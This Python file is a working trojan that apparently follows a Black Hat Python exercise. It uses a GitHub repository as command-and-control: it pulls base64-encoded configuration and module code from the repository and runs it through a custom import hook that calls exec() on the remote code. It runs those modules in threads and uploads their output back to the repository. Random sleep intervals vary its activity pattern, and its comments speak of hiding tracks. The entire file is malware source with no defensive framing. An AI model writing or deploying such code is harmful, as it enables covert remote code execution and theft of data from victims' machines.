import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
from contextlib import suppress

from datetime import datetime

def github_connect():                                                               #Perform connection to github account
    with open('token.txt') as f:
        token = f.read()
    user = 'DarkEtherDE'
    sess = github3.login(token=token)
    return sess.repository(user, 'bhptrojan')

def getContent(dirname, module_name, repo):                                         #Gather modules from config
    return repo.file_contents(f'{dirname}/{module_name}').content

class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path= f'data/{id}'
        self.repo = github_connect()
        
    def get_config(self):                                                           #Gather data from config and find all modules listed within
        config_json = getContent('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))
        for task in config:
            if task['module'] not in sys.modules:
                print(task['module'])
                exec("import %s" % task['module'])
            return config
        
    def moduleRun(self, module):
        with suppress(KeyError):                                                    #In the event of a keyerror due to incompatible file paths. Bypass the module to prevent modification and thus hiding tracks in fingerprints
            result = sys.modules[module].run()
            self.store_module_result(result)
        
    def store_module_result(self, data):
        message = str(datetime.now())                                               #Set message equal to current time
        if ':' in message:                                                          #Check if : in message
            message = message.replace(":", "-")                                     #Bypass to ensure files store properly in windows or linux
            print(message)
        remote_path = f'data/{self.id}/{message}.data'                              #Set file data path
        bindata = bytes('%r' % data, 'utf-8')
        self.repo.create_file(remote_path, message, base64.b64encode(bindata))      #Create your file with bit based data
        
    def run(self):                                                                  #Task execution
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(target=self.moduleRun, args=(task['module'],))
                thread.start()
                time.sleep(random.randint(1,10))                                    #Delay before tasks run again
            time.sleep(random.randint(1, 10))                                       #Delay between running times to add descripancy in activities
            
class GitImport:                        
    def __init__(self):
        self.current_module_code= ""
        
    def find_module(self, name, path=None):                                         #Attempt to find modules in github
        print("[*]Attempting to retrieve %s" % name)
        self.repo = github_connect()
        new_library = getContent('modules', f'{name}.py', self.repo)                #check for module in modules and grab data
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)                #Create new library
            return self
    
    def load_module(self, name):                                                    #Load all modules and create if none-existent
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec)                          
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module
    
if __name__ == '__main__':
    sys.meta_path.append(GitImport())
    trojan = Trojan('abc')
    print(trojan)
    trojan.run()